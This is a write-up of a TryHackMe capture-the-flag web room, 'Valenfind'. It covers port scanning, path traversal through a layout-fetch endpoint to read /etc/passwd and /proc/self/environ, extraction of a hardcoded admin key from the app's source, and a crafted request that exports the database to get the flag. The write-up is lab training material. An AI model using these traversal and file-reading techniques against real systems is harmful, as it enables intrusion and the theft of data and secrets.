# THM-Valenfind Write-up

> Challange Description:
> There’s this new dating app called “Valenfind” that just popped up out of nowhere. The creator only learned to code this year — which suggests insecure design decisions. The objective was to identify and exploit weaknesses in the web application to retrieve the flag.

Title: THM - Valenfind Write-up  
Date: 2026-02-14  
Author: Parthiv Kumar Nikku  
Tags: [tryhackme, web, path-traversal, medium]  



## Challenge Metadata

- **Room Name:** Valenfind  
- **Platform:** TryHackMe  
- **URL:** https://tryhackme.com/room/lafb2026e10  
- **Difficulty:** Medium  
- **Category:** Web  
- **Points:** 200  

---

### Scanning
I started scanning the target for potential open ports.. and i found the ssh port open.

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sV -A -p22 -sC $TARGET
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-14 16:21 IST
Nmap scan report for 10.49.137.221
Host is up (0.086s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 fe:1f:8d:7f:92:38:3d:71:87:9d:01:65:de:03:4d:8c (ECDSA)
|_  256 db:63:1e:b8:e4:25:80:10:18:d1:c3:7f:45:9b:2d:63 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (96%), Google Android 10.X|11.X|12.X (93%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/o:linux:linux_kernel:5.4 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3
Aggressive OS guesses: Linux 4.15 - 5.19 (96%), Linux 4.15 (96%), Linux 5.4 (96%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Android 10 - 11 (Linux 4.14) (92%), Android 9 - 10 (Linux 4.9 - 4.14) (92%), Android 12 (Linux 5.4) (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Lin
ux 3.1 - 3.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   87.80 ms 192.168.128.1
2   ...
3   88.40 ms 10.49.137.221

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.07 seconds

```

- I tried connecting to it to check if i can use hydra to brute-force the password but yea, its key based authentication..

- I then headed to the target webapp to start scanning.

- I created an account in the application and then logged in.. initially i thought its a injection kinda stuff but realized not because we have option to sign up!.

- One user amongest all seems suspecious for me.. the `cupid` his discription says something like this - *"I keep the database secure. No peeking."* and this guy caught my attention for obvious reasons

- but no lead for a while and slowly i noticed a option to change the profile theme.
![[Pasted image 20260214173729.png]]


Opened up burp suite and noticed that the profile themes are being fetched dynamically.


![[2026-02-14_17-03-18.png]]

The endpoint is `/api/fetch_layout`

Time for [[Path Traversal]], tried to fetch the `/etc/passwd`
![[2026-02-14_16-26-40.png]]

### some commands that made my work easier
In linux we have 
> `/proc/self/cmdline`
> The command stated will return the exact process that handles/started current process, (self).
> In this case all the processes are being handeled by the webapp and hence this returns the file that is responsible for this process.


> `/proc/self/envron`
> This is quite obvyous -  returns the environment variables


![[2026-02-14_16-37-54.png]]

The above screenshot show the path of the `app.py`

Now i tried to read up the source code of the app and the code has the following details:
![[2026-02-14_16-51-42.png]]
```python
ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
```

```python
@app.route('/api/admin/export_db')
def export_db():
    auth_header = request.headers.get('X-Valentine-Token')
    
    if auth_header == ADMIN_API_KEY:
        try:
            return send_file(DATABASE, as_attachment=True, download_name='valenfind_leak.db')
        except Exception as e:
            return str(e)
    else:
        return jsonify({"error": "Forbidden", "message": "Missing or Invalid Admin Token"}), 403
```

examining the above evidences, we can create a web request accordingly:

```nginx
GET /api/admin/export_db HTTP/1.1
Host: 10.49.137.221:5000
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: */*
Referer: http://10.49.137.221:5000/profile/cupid
Accept-Encoding: gzip, deflate, br
X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO
Cookie: session=eyJsaWtlZCI6W10sInVzZXJfaWQiOjEwLCJ1c2VybmFtZSI6InRlc3QxIn0.aZBT-Q.p7M_b3Nv53KBtJd2E0oSRDFE-ek
Connection: keep-alive


```

![[2026-02-14_17-00-44 1.png]]

This brings up the flag.